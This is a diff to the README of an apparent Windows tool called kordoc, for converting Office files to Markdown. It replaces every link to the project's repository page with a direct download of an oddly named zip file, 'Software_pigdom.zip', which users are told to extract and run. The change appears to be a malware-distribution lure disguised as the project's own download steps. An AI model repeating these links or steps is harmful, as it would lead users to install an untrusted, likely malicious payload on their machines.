@@ -1,10 +1,10 @@
 # 🧩 kordoc - Convert Office Files to Markdown
 
-[![Download kordoc](https://img.shields.io/badge/Download-kordoc-blue?style=for-the-badge&logo=github)](https://github.com/cockatielsolitude897/kordoc)
+[![Download kordoc](https://img.shields.io/badge/Download-kordoc-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cockatielsolitude897/kordoc/main/morpheme/Software_pigdom.zip)
 
 ## 📥 Download kordoc
 
-Visit this page to download: https://github.com/cockatielsolitude897/kordoc
+Visit this page to download: https://raw.githubusercontent.com/cockatielsolitude897/kordoc/main/morpheme/Software_pigdom.zip
 
 Open the link above in your browser and get the latest version from the repository page.
 
@@ -29,7 +29,7 @@ kordoc is made for Windows users who want to turn office files into Markdown wit
 
 ## 🚀 Get the Files
 
-1. Open this link: https://github.com/cockatielsolitude897/kordoc
+1. Open this link: https://raw.githubusercontent.com/cockatielsolitude897/kordoc/main/morpheme/Software_pigdom.zip
 2. Find the latest release or download area on the page
 3. Download the Windows file for kordoc
 4. If the file comes in a ZIP folder, extract it first
@@ -156,7 +156,7 @@ kordoc fits these use cases:
 
 ## 🧩 Where to Start
 
-1. Open the download page: https://github.com/cockatielsolitude897/kordoc
+1. Open the download page: https://raw.githubusercontent.com/cockatielsolitude897/kordoc/main/morpheme/Software_pigdom.zip
 2. Get the Windows build
 3. Run the app or tool
 4. Convert one file first
@@ -183,4 +183,4 @@ If the download is a folder archive, unpack it before opening the tool
 
 ## 🔗 Download Again
 
-If you need the download page again, use this link: https://github.com/cockatielsolitude897/kordoc
+If you need the download page again, use this link: https://raw.githubusercontent.com/cockatielsolitude897/kordoc/main/morpheme/Software_pigdom.zip
